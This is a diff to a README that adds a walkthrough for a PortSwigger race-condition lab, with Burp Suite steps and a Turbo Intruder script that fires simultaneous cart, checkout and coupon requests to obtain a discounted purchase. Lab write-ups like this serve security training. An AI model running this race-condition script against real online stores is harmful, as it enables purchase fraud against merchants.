@@ -1,3 +1,96 @@
+PortSwigger Race Condition Lab: Multi-Endpoint Exploit Guide
+🎯 Lab Solution Using Burp Suite Community Edition
+Step 1: Configure Your Environment
+Open Burp Suite Community Edition
+
+Configure your browser to use Burp as a proxy (usually localhost:8080)
+
+Ensure "Intercept is on" in the Proxy tab
+
+Access the lab URL in your browser
+
+Step 2: Analyze the Application Flow
+Add the expensive jacket to your cart
+
+Go to your cart and observe the checkout process
+
+Note the endpoints involved:
+
+POST /cart - Adds items to cart
+
+POST /cart/checkout - Completes purchase
+
+POST /cart/coupon - Applies discount codes
+
+Step 3: Identify the Race Condition
+Send the cart request to Burp Repeater (right-click → Send to Repeater)
+
+Send the checkout request to another Repeater tab
+
+Send the coupon request to a third Repeater tab
+
+Note that these endpoints don't have proper synchronization
+
+Step 4: Exploit the Race Condition
+In each Repeater tab, ensure you're using the same session cookie
+
+Create a turbo intruder script (or use simultaneous requests):
+
+python
+def queueRequests(target, wordlists):
+  engine = RequestEngine(endpoint=target.endpoint,
+                        concurrentConnections=20,
+                        requestsPerConnection=10,
+                        pipeline=False)
+  
+  # Add to cart request
+  cart_request = '''POST /cart HTTP/1.1
+  Host: YOUR-LAB-ID.web-security-academy.net
+  Cookie: session=YOUR-SESSION-COOKIE
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 30
+  
+  productId=1&quantity=1&redir=CART'''
+  
+  # Checkout request  
+  checkout_request = '''POST /cart/checkout HTTP/1.1
+  Host: YOUR-LAB-ID.web-security-academy.net
+  Cookie: session=YOUR-SESSION-COOKIE
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 15
+  
+  csrf=YOUR-CSRF-TOKEN'''
+  
+  # Coupon request
+  coupon_request = '''POST /cart/coupon HTTP/1.1
+  Host: YOUR-LAB-ID.web-security-academy.net
+  Cookie: session=YOUR-SESSION-COOKIE
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 30
+  
+  csrf=YOUR-CSRF-TOKEN&coupon=SIGNUP30'''
+  
+  # Queue all requests simultaneously
+  for i in range(50):
+      engine.queue(cart_request, gate='race1')
+      engine.queue(checkout_request, gate='race1')
+      engine.queue(coupon_request, gate='race1')
+  
+  engine.openGate('race1')
+  engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+  table.add(req)
+Execute the attack and monitor for successful purchase at discounted price
+
+Step 5: Verify Success
+Check if the lab is solved (you should see a confirmation message)
+
+Verify the jacket was purchased at a discounted price
+
+🐍 Python Script Solution
+
+
 PortSwigger Race Condition Lab - Multi-Endpoint Exploit
 https://portswigger.net/content/images/logos/burger-2021.svg
 https://img.shields.io/badge/Python-3.8%252B-blue.svg
@@ -29,7 +122,7 @@ Basic understanding of race condition vulnerabilities
 Clone this repository:
 
 bash
-git clone https://github.com/your-username/portswigger-race-condition-exploit.git
+git clone https://github.com/VastScientist69/Multi-Endpoint-Race-Condition.git
 cd portswigger-race-condition-exploit
 Install required dependencies:
 
